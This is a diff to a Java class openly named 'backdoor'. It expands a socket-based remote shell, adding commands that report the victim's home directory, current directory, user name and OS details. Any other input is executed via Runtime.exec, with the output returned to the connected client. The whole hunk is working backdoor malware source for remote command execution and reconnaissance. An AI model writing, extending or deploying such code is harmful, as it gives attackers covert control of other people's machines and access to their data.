@@ -20,23 +20,57 @@ public class backdoor {
 				OutputStreamWriter osr = new OutputStreamWriter(clientSocket.getOutputStream());
 				PrintWriter out = new PrintWriter(osr, true);
 
-				while(true){
+				loop: while(true){
 					out.print("> ");
 					out.flush();
 					String request = in.readLine();
-					if(request.equals("quit"))
-						break;
+					
+					switch(request){
+						case "QUIT":
+							break loop;
+						case "CMDLIST":
+							out.println("\tQUIT      exit from shell");
+							out.println("\tGETHOME   return the user home path");
+							out.println("\tGETDIR    return the current direcotry path");
+							out.println("\tGETNAME   return the user name");
+							out.println("\tOSARCH    return the Operating System architecture");
+							out.println("\tOSNAME    return the Operating System name");
+							out.println("\tOSVERS    return the Operating System version");							
+							break;
+						case "GETHOME":
+							out.println(System.getProperty("user.home"));
+							break;
+						case "GETDIR":
+							out.println(System.getProperty("user.dir"));
+							break;
+						case "GETNAME":
+							out.println(System.getProperty("user.name"));
+							break;	
+						case "OSARCH":
+							out.println(System.getProperty("os.arch"));
+							break;
+						case "OSNAME":
+							out.println(System.getProperty("os.name"));
+							break;
+						case "OSVERS":
+							out.println(System.getProperty("os.version"));
+							break;
+						default:
+							try{
+								Process process = Runtime.getRuntime().exec(request);
+								StringBuilder output = new StringBuilder();
 
-					processBuilder.command("bash", "-c", request);
-					Process process = processBuilder.start();
-					StringBuilder output = new StringBuilder();
-
-					BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-					String line;
-					while ((line = reader.readLine()) != null) {
-						out.println(line);
+								BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+								String line;
+								while ((line = reader.readLine()) != null) {
+									out.println(line);
+								}
+								process.waitFor();
+							} catch(IOException e){
+								out.println("Error: command not found");
+							}
+							break;						
 					}
-					process.waitFor();
 					
 				}
 							
